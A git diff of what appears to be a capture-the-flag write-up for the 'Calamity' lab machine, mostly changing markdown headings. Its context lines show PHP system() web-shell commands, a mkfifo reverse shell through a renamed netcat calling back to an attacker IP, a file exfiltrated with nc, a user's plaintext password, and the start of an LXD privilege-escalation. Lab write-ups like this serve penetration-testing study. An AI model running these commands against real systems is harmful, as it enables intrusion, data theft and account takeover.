@@ -15,7 +15,7 @@ Check useful information:
 <?php system('ls -lah /home/xalvas') ?>
 <?php system('cat /home/xalvas/intrusions') ?> 
 ```
-**COPY nc Method:**
+#### COPY nc Method:**
 ```shell
 <?php system('which nc') ?>
 
@@ -23,17 +23,18 @@ Check useful information:
 <?php system('chmod +x /dev/shm/harmless') ?>
 <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/harmless 10.10.14.11 1234 >/tmp/f') ?>
 ```
-**Try copy out to listen(TBC as CTF style):**
---------------------------------------------------------
+#### Try copy out to listen(TBC as CTF style):
 ```shell
+--------------------------------------------------------
 /home/xalvas/recov.wav -> recov.wav
 
 As nc blocked,
 cp /bin/nc ~/nba
 Kali: nc  -l -p 9090 > recov.wav
 Remote:./nba -w3 10.10.14.11 9090 < recov.wav
-```
 --------------------------------------------------------
+```
+
 
 Then know "xalvas" password and login SSH:
 18547936..*
@@ -47,7 +48,7 @@ git clone https://github.com/saghul/lxd-alpine-builder.git
 scp alpine-v3.9-i386-20190523_1714.tar.gz  xalvas@10.10.10.27:/tmp/
 Password: 18547936..*
 ```
-**Calamity:
+#### Calamity:
 ```shell
 xalvas@calamity:/tmp$ lxc image import alpine-v3.9-i386-20190523_1714.tar.gz --alias alpine
 Image imported with fingerprint: 8e6c7cb2b5f1d8c52d8a4912c485984414a2e6954ce46c7f08b6a4e99caae6aa
